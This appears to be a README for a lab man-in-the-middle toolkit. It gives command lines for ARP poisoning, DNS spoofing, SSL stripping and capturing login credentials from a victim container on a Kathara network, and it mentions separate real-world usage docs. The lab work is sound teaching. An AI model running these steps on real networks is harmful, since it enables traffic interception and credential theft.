# MITM Attack Toolkit - Kathara Lab Environment

This directory contains the MITM attack tools configured for use within the Kathara lab environment.

**For real-world usage outside the lab, see the [README.md in the root directory](../README.md).**

## Lab Setup

### Install Kathara

You need Kathara installed to run the lab network. The quickest way on a Debian/Ubuntu host is:

```bash
sudo apt update
sudo apt install -y docker.io docker-compose python3-pip
sudo pip3 install kathara
```

Ensure Docker is running and you have sufficient privileges (run with `sudo` or add your user to the `docker` group). For full, platform-specific instructions and troubleshooting, see the official Kathara documentation: https://kathara.org

### Starting the Lab

The Kathara lab has the following network topology:

- `web1` (10.0.0.1) - Gateway/Web server running HTTPS
- `dns1` (10.0.0.2) - DNS server
- `attacker` (10.0.0.3) - Attack machine (you are here)
- `pc2` (10.0.0.4) - Victim machine
- `pc3` (10.0.0.5) - Additional victim (optional)
From the repository root:

```bash
cd myLab
kathara lstart
```

Wait ~5 minutes for all containers to initialize. The attacker container will automatically install dependencies (scapy, requests) during startup.

### Accessing the Attacker Container

```bash
kathara connect attacker
cd /
```

## Running the Full Attack

### Automatic Discovery (Recommended)

This mode scans the lab network, classifies hosts, and lets you select the victim and spoofed domain interactively.

```bash
python3 exploit.py --auto-discover
```

In manual mode, the `exploit.py` orchestrator requires `--dns` (upstream DNS server) so the DNS forwarder can handle non-target queries and preserve victim internet connectivity. Auto-discover mode selects the DNS server automatically.

### OPTIONAL: Lab-Specific Command (No Auto-Discovery)

```bash
python3 exploit.py 10.0.0.4 10.0.0.1 \
    --dns 10.0.0.2 \
    --domain web1.mylab.test. \
    --attacker-ip 10.0.0.3 \
    --iface eth0
```

**If you intentionally want ARP + DNS only (no SSL stripping):**

```bash
python3 exploit.py 10.0.0.4 10.0.0.1 \
    --dns 10.0.0.2 \
    --domain web1.mylab.test. \
    --attacker-ip 10.0.0.3 \
    --iface eth0 \
    --no-ssl-strip
```
**Parameters explained:**
- `10.0.0.4` - Target victim (pc2)
- `10.0.0.1` - Gateway (web1)
- `--dns 10.0.0.2` - DNS server for forwarding non-target queries
- `--domain web1.mylab.test.` - Domain to spoof (note trailing dot)
- `--attacker-ip 10.0.0.3` - Your IP (attacker container)
- `--iface eth0` - Network interface in Kathara containers

### Optional Flags

- `--no-ssl-strip` - Disable SSL stripping (ARP + DNS only)
- `--ssl-port 8080` - SSL stripper listen port (default: 8080)
- `--delay 2.0` - Delay in seconds between ARP and DNS start (default: 2.0)

## Testing the Attack

From the victim container (pc2):

```bash
kathara connect pc2
```

### Verify DNS Spoofing

```bash
# Should return 10.0.0.3 (attacker)
dig web1.mylab.test

# Should return real IP (forwarded to 10.0.0.2)
dig google.com
```

### Verify SSL Stripping

```bash
# Should work (normally would be refused on HTTP)
curl http://web1.mylab.test/

# Should also work (DNS forwarding)
curl google.com
```

### Verify Credential Capture (Web Portal)

1. Visit `http://web1.mylab.test/` from the victim.
2. Submit the login form.
3. Check captures on web1:

```bash
kathara connect web1
cat /tmp/captured_credentials.log
```

4. Check captures on attacker (SSL strip logger):

```bash
cat /tmp/ssl_strip_credentials.log
```

5. Optional: submit a login via curl from the victim:

```bash
curl -i -X POST http://web1.mylab.test/login.php \
    -d "username=alice&password=SuperSecret123" \
    -H "Content-Type: application/x-www-form-urlencoded"
```

### Check ARP Poisoning

```bash
arp
# You should see attacker's MAC (8a:c7:ec:0e:53:05) for:
# - 10.0.0.1 (gateway)
# - 10.0.0.2 (DNS)
# - 10.0.0.3 (attacker)
```

## Running Individual Modules

For advanced users who want to run modules separately:

### 1. ARP Poisoning Only

```bash
python3 arp_poisoning.py 10.0.0.4 10.0.0.1 --dns 10.0.0.2
```

### 2. DNS Forwarder Only

```bash
python3 dns_spoofing.py \
    --domain web1.mylab.test. \
    --attacker-ip 10.0.0.3 \
    --dns-server 10.0.0.2 \
    --iface eth0
```

### 3. SSL Stripper Only

```bash
python3 ssl_strip.py \
    --upstream-host web1.mylab.test \
    --upstream-ip 10.0.0.1 \
    --target-ip 10.0.0.3
```

## Stopping the Attack

Press `Ctrl+C` **once** in the attacker terminal. The script will:
1. Send SIGINT to all child processes
2. Wait 3 seconds for graceful shutdown
3. Restore ARP tables
4. Remove iptables rules
5. Close all sockets

## Lab Environment Details

### Installed Dependencies

The attacker container automatically installs:
- `python3-scapy` - Packet crafting
- `requests` - HTTP/HTTPS proxy
- `net-tools` - Network utilities
- `iproute2` - IP routing
- Standard Python 3

### Network Configuration

- All containers are on the same LAN (10.0.0.0/24)
- IP forwarding is automatically enabled by the attack scripts
- iptables NAT rules are automatically managed
- DNS forwarder listens on port 5353
- SSL stripper listens on port 8080

### Attack Flow

1. **ARP Poisoning**: Victim believes attacker is the gateway and DNS server
2. **DNS Forwarder**: 
   - Intercepts all DNS queries via iptables REDIRECT to port 5353
   - Spoofs `web1.mylab.test` → `10.0.0.3`
   - Forwards other queries to real DNS (`10.0.0.2`)
3. **SSL Stripping**:
   - Intercepts HTTP (port 80) traffic via iptables REDIRECT to port 8080
   - Only intercepts traffic destined for 10.0.0.3 (prevents breaking other sites)
    - Proxies requests to HTTPS upstream (10.0.0.1) to bypass DNS spoofing
   - Downgrades responses to HTTP
    - Intercepts HTTPS redirects and serves content over HTTP
    - Logs captured credentials to `/tmp/ssl_strip_credentials.log`

## Troubleshooting

### "Address already in use" error
Wait a few seconds and try again. The SO_REUSEADDR socket option should prevent this, but ports need time to fully close.

### DNS not spoofing
Ensure you're using `--dns 10.0.0.2` flag so ARP poisoning redirects DNS queries to the attacker.

### SSL strip not working
Verify the domain is being spoofed correctly with `dig web1.mylab.test` from the victim.

### No internet access for victim
This is expected if the attack is running. The DNS forwarder allows access to non-target domains, but the victim's default route goes through the attacker.

## Stopping the Lab

```bash
# From myLab directory
kathara lclean

# Or for a proper wipe of the Lab environment
kathara wipe
```

This stops and removes all lab containers.

## Files in This Directory

- `attacker/` - Attack toolkit modules (exploit, discovery, ARP/DNS/SSL strip)
- `attacker.startup` - Kathara startup script (auto-installs dependencies)
- `*.startup` - Startup scripts for other containers
- `lab.conf` - Kathara network configuration
- `web1/monitor_captures.sh` - Live tail of captured credentials on web1
- `web1/var/www/html/` - HTTPS login portal and PHP capture handlers

## Need Help?

See detailed attack documentation in:
- [ATTACK_DOCS.md](../ATTACK_DOCS.md) - Comprehensive technical documentation

---
